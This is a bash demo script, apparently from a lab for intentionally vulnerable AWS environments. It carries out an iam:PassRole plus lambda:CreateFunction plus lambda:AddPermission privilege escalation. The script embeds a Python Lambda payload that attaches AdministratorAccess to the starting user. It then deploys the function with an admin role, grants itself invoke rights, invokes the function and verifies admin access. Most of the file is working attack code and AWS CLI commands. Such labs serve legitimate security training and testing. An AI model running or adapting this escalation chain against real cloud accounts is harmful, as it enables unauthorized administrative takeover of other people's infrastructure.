#!/bin/bash

# Demo script for iam:PassRole + lambda:CreateFunction + lambda:AddPermission privilege escalation
# This scenario demonstrates how a user with PassRole, CreateFunction, and AddPermission can escalate to admin


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-lambda-006-to-admin-starting-user"
ADMIN_ROLE="pl-prod-lambda-006-to-admin-target-role"
LAMBDA_FUNCTION_NAME="pl-lambda-006-malicious-function"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Lambda CreateFunction + AddPermission Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(OTEL_TRACES_EXPORTER= terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_lambda_006_iam_passrole_lambda_createfunction_lambda_addpermission.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(OTEL_TRACES_EXPORTER= terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(OTEL_TRACES_EXPORTER= terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(OTEL_TRACES_EXPORTER= terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Prepare Lambda function payload
echo -e "${YELLOW}Step 5: Preparing malicious Lambda function${NC}"
echo "Creating Python function that will attach AdministratorAccess to our user..."

# Create Lambda function code that attaches admin policy to starting user
cat > /tmp/lambda_function.py << EOF
import json
import boto3

def lambda_handler(event, context):
    """
    Attach AdministratorAccess managed policy to the starting user.
    This function is executed with admin role permissions.
    """
    iam = boto3.client('iam')

    user_name = '${STARTING_USER}'
    policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'

    try:
        # Attach AdministratorAccess policy to the starting user
        iam.attach_user_policy(
            UserName=user_name,
            PolicyArn=policy_arn
        )

        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': f'Successfully attached AdministratorAccess to {user_name}',
                'user': user_name,
                'policy': policy_arn
            })
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({
                'error': str(e),
                'message': 'Failed to attach admin policy'
            })
        }
EOF

# Create a zip file
cd /tmp
zip -q lambda_function.zip lambda_function.py
cd - > /dev/null

echo -e "${GREEN}✓ Malicious Lambda function payload prepared${NC}\n"

# [EXPLOIT] Step 6: Create Lambda function with admin role (PassRole escalation)
echo -e "${YELLOW}Step 6: Creating Lambda function with admin role${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "This is the privilege escalation vector - passing the admin role to Lambda..."
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"

show_attack_cmd "Attacker" "aws lambda create-function --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --runtime \"python3.11\" --role \"$ADMIN_ROLE_ARN\" --handler \"lambda_function.lambda_handler\" --zip-file \"fileb:///tmp/lambda_function.zip\" --timeout 30 --output json"
LAMBDA_RESULT=$(aws lambda create-function \
    --region $AWS_REGION \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --runtime "python3.11" \
    --role "$ADMIN_ROLE_ARN" \
    --handler "lambda_function.lambda_handler" \
    --zip-file "fileb:///tmp/lambda_function.zip" \
    --timeout 30 \
    --output json)

if [ $? -eq 0 ]; then
    FUNCTION_ARN=$(echo "$LAMBDA_RESULT" | jq -r '.FunctionArn')
    echo "Function ARN: $FUNCTION_ARN"
    echo -e "${GREEN}✓ Successfully created Lambda function with admin role!${NC}"
else
    echo -e "${RED}Error: Failed to create Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi
echo ""

# [EXPLOIT] Step 7: Add permission for our user to invoke the Lambda function
echo -e "${YELLOW}Step 7: Adding invoke permission via resource-based policy${NC}"
echo "Using lambda:AddPermission to allow our user to invoke the function..."

STATEMENT_ID="AllowUserInvoke"
USER_ARN="arn:aws:iam::${ACCOUNT_ID}:user/${STARTING_USER}"
echo "Adding permission for: $USER_ARN"

show_attack_cmd "Attacker" "aws lambda add-permission --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --statement-id \"$STATEMENT_ID\" --action \"lambda:InvokeFunction\" --principal \"$ACCOUNT_ID\" --source-arn \"$USER_ARN\" --output json"
aws lambda add-permission \
    --region $AWS_REGION \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --statement-id "$STATEMENT_ID" \
    --action "lambda:InvokeFunction" \
    --principal "$ACCOUNT_ID" \
    --source-arn "$USER_ARN" \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully added invoke permission to Lambda function!${NC}"
else
    echo -e "${RED}Error: Failed to add permission${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi
echo ""

# Step 8: Wait for Lambda function to be ready
echo -e "${YELLOW}Step 8: Waiting for Lambda function to be ready${NC}"
echo "Allowing time for Lambda function and permissions to propagate..."
sleep 15
echo -e "${GREEN}✓ Lambda function ready${NC}\n"

# [EXPLOIT] Step 9: Invoke the Lambda function to escalate privileges
echo -e "${YELLOW}Step 9: Invoking Lambda function to attach admin policy${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Invoking function: $LAMBDA_FUNCTION_NAME"

show_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --payload '{}' /tmp/response.json --output json"
aws lambda invoke \
    --region $AWS_REGION \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --payload '{}' \
    /tmp/response.json \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Lambda function invoked successfully${NC}"
    echo ""
    echo "Response from Lambda function:"
    cat /tmp/response.json | jq '.'
    echo ""
else
    echo -e "${RED}Error: Failed to invoke Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json
    exit 1
fi

# Step 10: Wait for IAM policy propagation
echo -e "${YELLOW}Step 10: Waiting for IAM policy to propagate${NC}"
echo "IAM changes can take time to propagate across all AWS endpoints..."
sleep 15
echo -e "${GREEN}✓ Policy propagation complete${NC}\n"

# [OBSERVATION] Step 11: Verify admin access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
echo "Checking if AdministratorAccess is now attached to starting user..."

show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER\" --query 'AttachedPolicies[*].PolicyArn' --output text"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER" \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text 2>/dev/null)

if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER${NC}"
else
    echo -e "${RED}✗ AdministratorAccess policy not found on $STARTING_USER${NC}"
    echo -e "${YELLOW}Note: IAM propagation can take up to 60 seconds. Try running the list-attached-user-policies command again.${NC}"
fi
echo ""

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo -e "${YELLOW}Note: IAM propagation can take up to 60 seconds. Try running the list-users command again.${NC}"
fi
echo ""

# Clean up temporary files
rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, lambda:CreateFunction, lambda:AddPermission)"
echo "2. Created Lambda function and passed admin role to it"
echo "3. Used lambda:AddPermission to add resource-based policy allowing invoke"
echo "4. Invoked Lambda function to attach AdministratorAccess to our user"
echo "5. Achieved: Administrator Access via attached managed policy"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (PassRole + CreateFunction) → Lambda with $ADMIN_ROLE"
echo "  → (AddPermission) → Allow self-invoke → (InvokeFunction) → Attach Admin Policy → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Lambda Function: $LAMBDA_FUNCTION_NAME"
echo "- Function Role: $ADMIN_ROLE"
echo "- AdministratorAccess policy attached to: $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The Lambda function is still deployed${NC}"
echo -e "${RED}⚠ AdministratorAccess is still attached to the starting user${NC}"
echo -e "${RED}⚠ Lambda functions incur charges when invoked${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
